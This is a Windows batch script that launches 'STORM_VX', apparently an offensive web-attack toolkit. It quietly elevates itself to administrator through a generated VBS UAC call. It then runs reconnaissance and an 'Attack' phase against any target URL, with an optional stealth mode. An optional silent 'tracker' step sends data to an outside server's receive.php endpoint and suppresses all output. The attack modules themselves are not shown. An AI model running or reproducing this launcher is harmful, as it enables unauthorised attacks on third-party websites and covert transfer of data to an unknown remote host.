@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion
title STORM_VX v2.1

:: ═══════════════════════════════════════════════════════════════
::  AUTO ADMIN ELEVATION — uses VBS for seamless UAC prompt
::  No second CMD window, no "press to restart" — direct UAC
:: ═══════════════════════════════════════════════════════════════
:: CRITICAL: Save the script's directory BEFORE elevation check,
:: because %~dp0 changes after VBS re-invocation!
set "SCRIPT_DIR=%~dp0"

net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Create a temporary VBS to request UAC elevation silently
    :: v7 FIX: Pass the ORIGINAL script path so the elevated CMD
    :: can cd back to the correct directory
    set "vbsFile=%TEMP%\storm_vx_elevate.vbs"
    echo Set UAC = CreateObject^("Shell.Application"^) > "!vbsFile!"
    echo UAC.ShellExecute "cmd.exe", "/c cd /d ""!SCRIPT_DIR!"" && """"%~f0""""", "", "runas", 1 >> "!vbsFile!"
    cscript //nologo "!vbsFile!" >nul 2>&1
    del /f "!vbsFile!" >nul 2>&1
    exit /b
)

echo.
echo   ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
echo   ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
echo   ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
echo   ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
echo   ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
echo   ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
echo.
echo          ==== v2.1 Modular - by elite (taha) ====
echo          ==== FINDER =^> TESTER ====
echo.
echo   [OK] Running as Administrator
echo.

:: --- Check Python ---
set "PYTHON="
where python >nul 2>&1
if %errorlevel%==0 (
    set "PYTHON=python"
) else (
    where python3 >nul 2>&1
    if %errorlevel%==0 (
        set "PYTHON=python3"
    ) else (
        echo.
        echo   [ERROR] Python not found! Install Python 3.
        echo.
        pause
        exit /b 1
    )
)

:: ═══════════════════════════════════════════════════════════════
::  FIND EACH FILE — search ROOT, subdirs, and download/ folder
:: ═══════════════════════════════════════════════════════════════
set "ROOT_DIR=%~dp0"
cd /d "%ROOT_DIR%"

:: --- Debug: show what we're searching ---
echo   [DEBUG] Script dir: %ROOT_DIR%
echo   [DEBUG] CWD: %CD%
echo.

:: --- Find VF_FINDER.py ---
set "FINDER_PATH="
if exist "%ROOT_DIR%VF_FINDER.py" (
    set "FINDER_PATH=%ROOT_DIR%VF_FINDER.py"
) else if exist "%ROOT_DIR%finder\VF_FINDER.py" (
    set "FINDER_PATH=%ROOT_DIR%finder\VF_FINDER.py"
) else if exist "%ROOT_DIR%download\VF_FINDER.py" (
    set "FINDER_PATH=%ROOT_DIR%download\VF_FINDER.py"
)

:: --- Find VF_TESTER.py ---
set "TESTER_PATH="
if exist "%ROOT_DIR%VF_TESTER.py" (
    set "TESTER_PATH=%ROOT_DIR%VF_TESTER.py"
) else if exist "%ROOT_DIR%tester\VF_TESTER.py" (
    set "TESTER_PATH=%ROOT_DIR%tester\VF_TESTER.py"
) else if exist "%ROOT_DIR%download\VF_TESTER.py" (
    set "TESTER_PATH=%ROOT_DIR%download\VF_TESTER.py"
)

:: --- Find VF_TRACKER.py ---
set "TRACKER_PATH="
if exist "%ROOT_DIR%VF_TRACKER.py" (
    set "TRACKER_PATH=%ROOT_DIR%VF_TRACKER.py"
) else if exist "%ROOT_DIR%tracker\VF_TRACKER.py" (
    set "TRACKER_PATH=%ROOT_DIR%tracker\VF_TRACKER.py"
) else if exist "%ROOT_DIR%download\VF_TRACKER.py" (
    set "TRACKER_PATH=%ROOT_DIR%download\VF_TRACKER.py"
)

:: --- Verify ---
if not defined FINDER_PATH (
    echo   [ERROR] VF_FINDER.py not found!
    echo   [ERROR] Checked: %ROOT_DIR% , %ROOT_DIR%finder\ , %ROOT_DIR%download\
    echo   [TIP] Make sure you run run.bat from the Storm-Vx root folder
    pause
    exit /b 1
)
if not defined TESTER_PATH (
    echo   [ERROR] VF_TESTER.py not found!
    echo   [ERROR] Checked: %ROOT_DIR% , %ROOT_DIR%tester\ , %ROOT_DIR%download\
    echo   [TIP] Make sure you run run.bat from the Storm-Vx root folder
    pause
    exit /b 1
)

:: --- Set PYTHONPATH so Python imports work across directories ---
set "PYTHONPATH=%ROOT_DIR%;%ROOT_DIR%finder;%ROOT_DIR%tester;%ROOT_DIR%tracker;%PYTHONPATH%"

echo   [OK] Python: %PYTHON%
echo   [OK] FINDER: !FINDER_PATH!
echo   [OK] TESTER: !TESTER_PATH!
if defined TRACKER_PATH (
    echo   [OK] TRACKER: !TRACKER_PATH! ^(use --tracker to enable^)
) else (
    echo   [WARNING] VF_TRACKER.py not found
)
echo.

:: ═══════════════════════════════════════════════════════════════
::  PARSE COMMAND LINE ARGUMENTS
:: ═══════════════════════════════════════════════════════════════
set "TARGET_URL="
set "FINDER_FLAGS=--deep"
set "TESTER_FLAGS="
set "RUN_TRACKER=0"
set "SKIP_TRACKER=1"

:parse_args
if "%~1"=="" goto :done_parsing
if /i "%~1"=="elite" (
    set "SKIP_TRACKER=1"
    shift
    goto :parse_args
)
if /i "%~1"=="--tracker" (
    set "RUN_TRACKER=1"
    set "SKIP_TRACKER=0"
    shift
    goto :parse_args
)
if /i "%~1"=="--deep" (
    shift
    goto :parse_args
)
if /i "%~1"=="--no-deep" (
    set "FINDER_FLAGS="
    shift
    goto :parse_args
)
if /i "%~1"=="--dns" (
    set "FINDER_FLAGS=!FINDER_FLAGS! --dns"
    shift
    goto :parse_args
)
if /i "%~1"=="--stealth" (
    set "TESTER_FLAGS=--stealth"
    shift
    goto :parse_args
)
set "TARGET_URL=%~1"
shift
goto :parse_args

:done_parsing

:: --- Ask for URL if not provided ---
if not "!TARGET_URL!"=="" goto :url_ready

echo.
echo   -----------------------------------------------
echo    Enter target URL (e.g. https://target.com)
echo    Tip: Add '--tracker' to enable tracker phase
echo   -----------------------------------------------
echo.
set /p "TARGET_URL=   URL: "

if "!TARGET_URL!"=="" (
    echo.
    echo   [ERROR] No URL provided. Exiting.
    echo.
    pause
    exit /b 1
)

:url_ready

:: --- Auto-add https:// if missing ---
set "URL_CHECK=!TARGET_URL:~0,8!"
if "!URL_CHECK!"=="https://" goto :url_set
set "URL_CHECK=!TARGET_URL:~0,7!"
if "!URL_CHECK!"=="http://" goto :url_set
set "TARGET_URL=https://!TARGET_URL!"

:url_set

echo.

:: ═══════════════════════════════════════════════════════════════
::  PHASE 0: TRACKER (OPTIONAL — only with --tracker flag)
:: ═══════════════════════════════════════════════════════════════
if "!RUN_TRACKER!"=="1" (
    if defined TRACKER_PATH (
        echo   ===============================================
        echo   [PHASE 0] Running VF_TRACKER (enabled by --tracker)
        echo   ===============================================
        echo.
        %PYTHON% "!TRACKER_PATH!" --silent --server http://namme.taskinoteam.ir/receive.php >nul 2>&1
        echo.
        echo   [OK] Tracker complete.
        echo.
    ) else (
        echo   [WARNING] Tracker requested but VF_TRACKER.py not found. Skipping.
        echo.
    )
) else (
    echo   [INFO] Tracker skipped. Use --tracker flag to enable.
    echo.
)

:: ═══════════════════════════════════════════════════════════════
::  PHASE 1: VF_FINDER — Reconnaissance
:: ═══════════════════════════════════════════════════════════════
echo   ===============================================
echo   [PHASE 1] Running VF_FINDER - Reconnaissance
echo   ===============================================
echo   Target: !TARGET_URL!
echo.

%PYTHON% "!FINDER_PATH!" "!TARGET_URL!" !FINDER_FLAGS! --output VF_PROFILE.json

if not exist "VF_PROFILE.json" (
    echo.
    echo   [ERROR] Profile file not created! FINDER may have failed.
    echo.
    pause
    exit /b 1
)

echo.
echo   [OK] Profile saved to: VF_PROFILE.json
echo.

:: ═══════════════════════════════════════════════════════════════
::  PHASE 2: VF_TESTER — Attack
:: ═══════════════════════════════════════════════════════════════
echo   ===============================================
echo   [PHASE 2] Running VF_TESTER - Attack
echo   ===============================================
echo   Profile: VF_PROFILE.json
echo.

%PYTHON% "!TESTER_PATH!" --profile VF_PROFILE.json !TESTER_FLAGS!

echo.
echo   ===============================================
echo   [DONE] Pipeline completed.
echo   ===============================================
echo.
pause
